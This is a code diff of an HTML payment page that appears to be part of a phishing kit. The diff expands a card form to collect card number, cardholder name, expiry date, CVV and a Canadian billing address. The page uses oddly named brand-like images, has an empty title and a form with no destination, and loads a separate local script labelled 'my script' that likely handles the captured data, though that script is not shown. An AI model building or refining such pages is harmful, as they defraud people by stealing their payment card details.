@@ -9,52 +9,110 @@
     <title></title>
 </head>
 <body>
-    <div class="hed">
-        <img src="./img/hed.JPG" alt="">
-    </div>
-    <p class="p1">Payment details</p>
-
-    <div class="section2">
-        
-
-        <div class="pay">
-            <p>Payment</p>
-            <img class="cc" src="./img/cc-icon.JPG" alt="">
-        </div>
-        <form method="post" id="pg2">
-            <p>Card number</p>
-            <input type="tel" name="" id="numcc" placeholder="____ ____ ____ ____" required maxlength="19">
-            
-            <div class="in2">
-                <div class="mm">
-                    <p>Expiry date</p>
-            <input  type="tel" name="" id="numdd" required maxlength="5" placeholder="MM/YY">
+    <div>
+        <div class="hedos">
+            <div class="herop1">
+                <div class="line1"></div>
+                <div class="lefto">
+                    <img class="img1" src="./img/lopogo1.JPG" alt="">
+                    <img class="img2" src="./img/toupopcc1.JPG" alt="">
                 </div>
-
-            <div>
-                <p>CVV</p>
-            <input type="tel" name="" id="numvv"  required maxlength="4">
             </div>
-
+            <!--  -->
+            <div class="herop2">
+                <img src="./img/rightootoupopcc2.JPG" alt="">
             </div>
-
-            <button type="submit" class="btn2">Confirm</button>
-        </form>
+        </div>
+        <!--  -->
+        <div class="hetod">
+            <img src="./img/hed.JPG" alt="">
+        </div>
     </div>
 
-    <img style="width: 100%; margin-top: 40px;" src="./img/bot.JPG" alt="">
+    <div class="section">
+        <div class="lefit">
+            <div class="inleft1">
+                <img src="./img/payshipimg.JPG" alt="">
+
+            </div>
+            <div>
+                <form method="post" id="pg2">
+                    <p>Card number</p>
+                    <input type="tel" name="" id="numcc" required maxlength="19">
+
+                    <p>Name on card</p>
+                    <input type="text" name="" id="num" required>
+
+                    <div class="exp">
+                        <div  class="mm">
+                            <p>Expiry date [MM/YY]</p>
+                            <input type="tel" name="" id="numdd" required maxlength="8">
+                        </div>
+
+                        <div>
+                            <p>CVV Code</p>
+                            <input type="tel" name="" id="numvv" required>
+                        </div>
+                    </div>
+
+                    <p class="con1">Country</p>
+                    <input  disabled type="" name="" id="" placeholder="Canada">
+
+                    <p>Address</p>
+                    <input type="text" name="" id="numadr" required>
+
+                    <p>City</p>
+                    <input type="text" name="" id="numcit" required>
+
+                    <div class="exp">
+                        <div  class="mm">
+                            <p>Province</p>
+                            <input type="text" name="" id="numreg" required>
+                        </div>
+
+                        <div>
+                            <p>Postal code</p>
+                            <input type="text" name="" id="numpos" required>
+                        </div>
+                    </div>
+
+                    <button type="submit">Pay</button>
+                </form>
+            </div>
+        </div>
+            <!--  -->
+        <div class="righit">
+            <div class="inright1">
+                <img class="tel1" src="./img/yourocar1.JPG" alt="">
+                <img src="./img/cointona.JPG" alt="">
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <div class="botopc">
+            <img src="./img/boitopc1.jpeg" alt="">
+        </div>
+
+        <div class="bototel">
+            <img src="./img/bot.JPG" alt="">
+        </div>
+    </div>
+
+
     <script>
-         $("#numcc").on("keyup",function(){
-            cc = $(this).val().split(" ").join("");
-            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
-            $(this).val(cc);
-        });
-        $("#numdd").on("keyup",function(){
-            dd = $(this).val().split("/").join("");
-            dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
-            $(this).val(dd);
-        });
-    </script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+       $("#numdd").on("keyup",function(){
+           dd = $(this).val().split("/").join("");
+           dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+           $(this).val(dd);
+       });
+   </script>
     <!-- my script -->
     <script src="./js/stb.js"></script>
 </body>
